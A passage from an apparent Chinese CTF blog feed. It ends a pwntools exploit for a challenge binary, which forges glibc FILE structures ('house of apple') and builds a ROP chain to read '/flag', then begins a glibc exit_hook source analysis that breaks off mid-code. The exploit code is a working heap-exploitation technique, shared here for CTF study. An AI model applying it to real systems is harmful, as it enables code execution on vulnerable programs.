class="line">elf = ELF(<span class="string">&#x27;./oneday&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./oneday&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">opt</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter your command:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choise: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(opt), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter your command:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, msg</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter your command:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Message:&#x27;</span>)</span><br><span class="line">    r.send(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter your command:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">IO_write_base=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              IO_write_ptr=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _chain=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _lock=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _wide_data=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _mode=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(IO_write_base) + p64(IO_write_ptr)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_chain) + p32(<span class="number">0</span>) + p32(<span class="number">8</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_lock)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_wide_data)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_mode)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;enter your key &gt;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Message: \n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1f2cc0</span></span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x17f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">_IO_list_all = libc_base + <span class="number">0x1f3660</span></span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">pop_rdx = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)))</span><br><span class="line">point_guard_addr = libc_base + <span class="number">0x3c0770</span> - <span class="number">0x10</span></span><br><span class="line">_IO_wstrn_jumps = libc_base + <span class="number">0x1f3d20</span></span><br><span class="line">_IO_cookie_jumps = libc_base + <span class="number">0x1f3ae0</span></span><br><span class="line">gadget = libc_base + <span class="number">0x146020</span></span><br><span class="line">setcontext = libc_base + <span class="number">0x50bc0</span></span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = heap_base + <span class="number">0x1a88</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">file1 = pack_file(<span class="number">0</span>, <span class="number">1</span>, heap_base + <span class="number">0x1900</span>, libc_base + <span class="number">0x1f5720</span>,</span><br><span class="line">                  point_guard_addr, <span class="number">0</span>, _IO_wstrn_jumps)</span><br><span class="line">file2 = pack_file(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, libc_base + <span class="number">0x1f5720</span>, <span class="number">0</span>, <span class="number">0</span>, _IO_cookie_jumps + <span class="number">0x58</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">create(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, _IO_list_all - <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0xa81</span>) + file1[<span class="number">0x10</span>:]</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + file2 + flat(</span><br><span class="line">    heap_base + <span class="number">0x1900</span> + <span class="number">0x100</span>, ROL(gadget ^ (heap_base + <span class="number">0x1900</span>), <span class="number">0x11</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext + <span class="number">61</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span> + <span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(flag_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(</span><br><span class="line">    <span class="number">0x108</span> + <span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="number">0x1900</span> + <span class="number">0x200</span>) + p64(open_addr)</span><br><span class="line">payload = payload.ljust(</span><br><span class="line">    <span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base + libc.bss() + <span class="number">0x100</span>,</span><br><span class="line">                           pop_rdx, <span class="number">0x100</span>, read_addr)</span><br><span class="line">payload = payload + flat(pop_rdi, <span class="number">1</span>, pop_rsi, libc_base + libc.bss() + <span class="number">0x100</span>,</span><br><span class="line">                         pop_rdx, <span class="number">0x100</span>, write_addr) + <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa90</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(<span class="number">0</span>, <span class="number">0xab1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xaa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base + libc.bss() + <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(</span><br><span class="line">    r,</span><br><span class="line">    <span class="string">&#x27;b*$rebase(0x1439)\ndir ../glibc_source/glibc-2.34/libio/\nb _IO_wstrn_overflow&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;enter your command:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>house of apple与以往的house of系列存在一定区别，他的效果只是任意地址写堆地址，将_IO_FILE地址+0xf0的地址写到<code>_IO_wide_data</code>所指向的地址(当然结合源码看的话可以看出来是进行一定范围的写操作)</p><p>其实house of apple只是单纯的利用fcloseall函数会循环调用<code>_IO_FILE</code>的_chain，也就是利用一次任意地址写的机会进行多次<code>_IO_FILE</code>利用</p><hr><p>参考链接：<a class="link"   href="https://bbs.pediy.com/thread-273418.htm" >https://bbs.pediy.com/thread-273418.htm<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简单介绍&quot;&gt;&lt;a href=&quot;#简单介绍&quot; class=&quot;headerlink&quot; title=&quot;简单介绍&quot;&gt;&lt;/a&gt;简单介绍&lt;/h2&gt;&lt;p&gt;在高版本中large bin attack算是为数不多的可以任意地址写堆地址的方法。&lt;/p&gt;
&lt;p&gt;这一利用方式是相较于其他</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>exit_hook</title>
    <link href="https://cv196082.gitee.io/2022/06/18/exit-hook/"/>
    <id>https://cv196082.gitee.io/2022/06/18/exit-hook/</id>
    <published>2022-06-18T07:27:49.000Z</published>
    <updated>2022-08-10T08:06:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知的俩hook在glibc2.34移除了，不过exit_hook好像在这个版本的glibc表现得也不是很佳，不过在近期遇到的两道题目都需要用到这方面的知识所以来补了。</p><h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h2><p>首先呢，程序正常退出以及使用exit函数都会调用exit所以不仅限于存在exit的题目适合</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function">    <span class="title">exit</span> <span class="params">(<span class="keyword">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>exit函数就只是单纯的调用了另一个函数，重点还是在另一个函数上面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">    attribute_hidden</span><br><span class="line">    __run_exit_handlers (<span class="keyword">int</span> status, struct exit_function_list **listp,</span><br><span class="line">                         <span class="keyword">bool</span> run_list_atexit, <span class="keyword">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span> (run_dtors)</span><br><span class="line">            __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">        __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">        restart:</span><br><span class="line">        cur = *listp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">            __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">            __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">            __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">            <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">                    <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">                    <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ef_free:</span><br><span class="line">                <span class="keyword">case</span> ef_us:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_on:</span><br><span class="line">                    onfct = f-&gt;func.on.fn;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (onfct);</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                    onfct (status, f-&gt;func.on.arg);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_at:</span><br><span class="line">                    atfct = f-&gt;func.at;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (atfct);</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                    atfct ();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_cxa:</span><br><span class="line">                    <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">                    f-&gt;flavor = ef_free;</span><br><span class="line">                    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (cxafct);</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                    cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Re-lock again before looking at global state.  */</span></span><br><span class="line">            __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">                <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">                <span class="keyword">goto</span> restart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line">            <span class="built_in">free</span> (cur);</span><br><span class="line"></span><br><span class="line">        __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">    _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先将源码放在这里，因为但看源码看不出什么</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220616184018220.png"                      alt="image-20220616184018220"                ></p><p>但是通过调试可以看到这里是调用了_dl_fini函数，而这个函数在<a href="https://cv196082.gitee.io/2022/03/07/house-of-banana/">house of banana</a>中提到过并且适用libc的版本还挺高在glibc2.34都是可以使用的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">    _dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">    again:</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line">            <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">            || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">            __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">     copy the pointers in.  */</span></span><br><span class="line">            struct link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">                &#123;</span><br><span class="line">                    assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = 